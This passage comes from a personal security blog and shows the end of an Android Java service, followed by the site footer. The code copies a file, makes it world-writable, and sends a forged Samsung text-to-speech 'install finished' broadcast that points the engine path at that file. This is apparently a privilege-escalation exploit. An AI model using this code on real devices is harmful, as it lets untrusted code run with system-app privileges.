class="keyword">try</span> &#123;</span><br><span class="line">                    copyfile(input, output);</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 &quot;</span> + output);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">bi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                bi.setAction(<span class="string">&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;</span>);</span><br><span class="line">                ArrayList&lt;CharSequence&gt; s = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                bi.putCharSequenceArrayListExtra(<span class="string">&quot;BROADCAST_CURRENT_LANGUAGE_INFO&quot;</span>, s);</span><br><span class="line">                bi.putExtra(<span class="string">&quot;BROADCAST_CURRENT_LANGUAGE_VERSION&quot;</span>, <span class="string">&quot;99999&quot;</span>);</span><br><span class="line">                bi.putCharSequenceArrayListExtra(<span class="string">&quot;BROADCAST_DB_FILELIST&quot;</span>, s);</span><br><span class="line">                bi.putExtra(<span class="string">&quot;SMT_ENGINE_VERSION&quot;</span>, <span class="number">0x2590cd5b</span>);<span class="comment">//installed version is 361811291</span></span><br><span class="line">                bi.putExtra(<span class="string">&quot;SMT_ENGINE_PATH&quot;</span>, input);</span><br><span class="line">                sendBroadcast(bi);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">buffer0verflooow</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
